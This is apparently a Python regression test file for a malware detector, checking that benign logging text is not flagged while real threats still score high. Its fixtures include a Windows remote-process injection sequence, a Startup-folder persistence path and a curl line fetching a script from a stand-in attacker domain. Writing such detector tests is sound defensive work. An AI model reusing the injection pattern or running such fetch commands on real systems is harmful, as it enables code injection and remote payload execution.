"""Regression tests for context-aware false-positive suppression."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from core.llm_analyzer import _fallback_analysis


def test_logger_and_exploit_text_not_critical():
    content = """
import logging
logger = logging.getLogger(__name__)

def startup():
    logger.info("Heuristic docs: exploit and shellcode indicators")
    return True
"""
    result = _fallback_analysis("app/startup.py", "modified", content)

    assert result["risk_score"] <= 5
    assert result["priority"] in {"info", "low", "medium"}
    assert result["is_malicious"] is False
    assert "logger.info" not in result.get("iocs", [])
    assert "logging.info" not in result.get("iocs", [])


def test_weak_single_indicator_in_tests_path_is_downgraded():
    content = """
# test fixture content for detection quality
logger.info("shellcode")
"""
    result = _fallback_analysis("tests/test_detector.py", "modified", content)

    assert result["risk_score"] <= 6
    assert result["is_malicious"] is False


def test_real_shellcode_pattern_stays_high():
    content = """
unsigned int payload = 0x9090909090;
void run() {
    VirtualAllocEx(hProc, 0, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, addr, payload, 1024, 0);
    CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
}
"""
    result = _fallback_analysis("src/injector.c", "new", content)

    assert result["risk_score"] >= 8
    assert result["is_malicious"] is True
    assert result["priority"] in {"high", "critical"}


def test_actual_startup_folder_still_scores_high():
    path = r"C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk"
    result = _fallback_analysis(path, "new", "shortcut target")

    assert result["risk_score"] >= 7
    assert result["priority"] in {"high", "critical"}


def test_domain_ioc_from_url_still_detected():
    content = "curl https://evil-control.com/payload.sh"
    result = _fallback_analysis("scripts/fetch.sh", "new", content)

    assert "evil-control.com" in result.get("iocs", [])
